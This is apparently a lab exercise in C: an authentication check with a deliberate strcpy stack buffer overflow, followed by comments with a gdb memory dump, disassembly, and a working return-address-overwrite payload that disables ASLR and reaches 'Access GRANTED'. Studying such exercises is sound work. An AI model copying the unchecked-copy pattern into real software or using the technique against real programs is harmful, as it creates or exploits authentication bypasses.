#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void usage(int checkthis, char** vector){
	if (checkthis < 2){
		printf("USAGE: %s [string]\n", vector[0]);
		exit(-1);
	}
}

int check_auth(char *pass){
	char passbuf[16];
	int authed = 0;		// if defined BEFORE passbuf, would be placed on the stack BEFORE passbuf
				//, and could then overflow into authed and make value non-zero, granting access
				//, by the IF statement around check_auth in main()
	strcpy(passbuf, pass);
	if(strcmp(passbuf,"whatever") == 0){
		authed = 1;
	}
	if(strcmp(passbuf,"something") ==0){
		authed = 1;
	}
	return authed;
}

int main(int argc, char* argv[]){
	usage(argc,argv);
	if(check_auth(argv[1])){				// note
		printf("[!] Access GRANTED\n");
	}else{
		printf("[!] Access DENIED\n");
	}
}



// run $(perl -e 'print "A"x40 . "B"x8;')
/*
   0x7fffffffe8c0: 0x00007fffffffe8e6      0x00007fffffffec7a
   0x7fffffffe8d0: 0x4141414141414141      0x4141414141414141
   0x7fffffffe8e0: 0x4141414141414141      0x4141414141414141
   0x7fffffffe8f0: 0x4141414141414141      0x4242424242424242ret
*/
/*
   0x000055555555524b <+46>:    call   0x5555555551b6 <check_auth>
   0x0000555555555250 <+51>:    test   eax,eax
   0x0000555555555252 <+53>:    je     0x555555555262 <main+69>
   0x0000555555555254 <+55>:    lea    rdi,[rip+0xdd0]        # 0x55555555602b
   0x000055555555525b <+62>:    call   0x555555555040 <puts@plt>
   0x0000555555555260 <+67>:    jmp    0x55555555526e <main+81>
   0x0000555555555262 <+69>:    lea    rdi,[rip+0xdd5]        # 0x55555555603e
   0x0000555555555269 <+76>:    call   0x555555555040 <puts@plt>
   0x000055555555526e <+81>:    mov    eax,0x0
   0x0000555555555273 <+86>:    leave  
   0x0000555555555274 <+87>:    ret 
*/
/* with:   echo 0 > /proc/sys/kernel/randomize_va_space
 * ./auth_overflow2.elf $(perl -e 'print "A"x40 . "\x54\x52\x55\x55\x55\x55";')  ## 0x0000555555555254 
 * [!] Access GRANTED
 * 
 */

